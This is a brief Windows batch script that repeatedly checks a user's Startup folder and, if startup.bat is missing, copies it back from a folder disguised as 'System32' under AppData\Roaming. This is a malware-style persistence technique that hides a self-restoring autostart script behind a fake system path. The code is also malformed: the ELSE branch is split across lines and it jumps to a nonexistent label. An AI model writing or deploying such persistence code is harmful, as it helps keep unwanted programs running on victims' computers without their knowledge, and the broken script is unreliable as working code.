@echo off 
:loop1  
IF EXIST "C:\Users\Popeye\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  
	ECHO "nothing"  
	)  
	ELSE  
	(  
	copy "C:\Users\Popeye\AppData\Roaming\System32\startup.bat" "C:\Users\Popeye\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  
	)  
goto loop2  
